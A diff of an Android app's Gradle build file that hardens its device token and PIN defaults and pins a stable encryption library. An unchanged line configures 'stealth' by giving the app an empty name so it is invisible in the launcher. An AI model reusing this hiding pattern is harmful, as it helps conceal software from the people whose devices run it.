@@ -22,11 +22,15 @@ android {
         
         // Device Authentication Token from Gradle Property (-PdeviceToken="...")
         // Generate unique token per deployment: openssl rand -base64 32
-        def deviceToken = project.hasProperty('deviceToken') ? project.deviceToken : System.getenv('DEVICE_AUTH_TOKEN') ?: ''
+        def deviceToken = project.hasProperty('deviceToken') ? project.deviceToken : System.getenv('DEVICE_AUTH_TOKEN') ?: UUID.randomUUID().toString()
         buildConfigField "String", "DEVICE_AUTH_TOKEN", "\"${deviceToken}\""
 
         // Device PIN from Gradle Property (-PdevicePin="XXXX")
-        buildConfigField "String", "DEVICE_PIN", "\"${project.findProperty('devicePin') ?: '0000'}\""
+        def devicePin = project.findProperty('devicePin')
+        if (devicePin == null || devicePin == '') {
+            throw new GradleException("devicePin must be set via -PdevicePin=XXXX")
+        }
+        buildConfigField "String", "DEVICE_PIN", "\"${devicePin}\""
 
         // Stealth: Empty app name (invisible in launcher)
         resValue "string", "app_name", ""
@@ -91,7 +95,7 @@ dependencies {
     implementation 'androidx.work:work-runtime-ktx:2.9.0'
 
     // Encryption
-    implementation 'androidx.security:security-crypto:1.1.0-alpha06'
+    implementation 'androidx.security:security-crypto:1.0.0'
 
     // JSON Parsing
     implementation 'com.google.code.gson:gson:2.10.1'
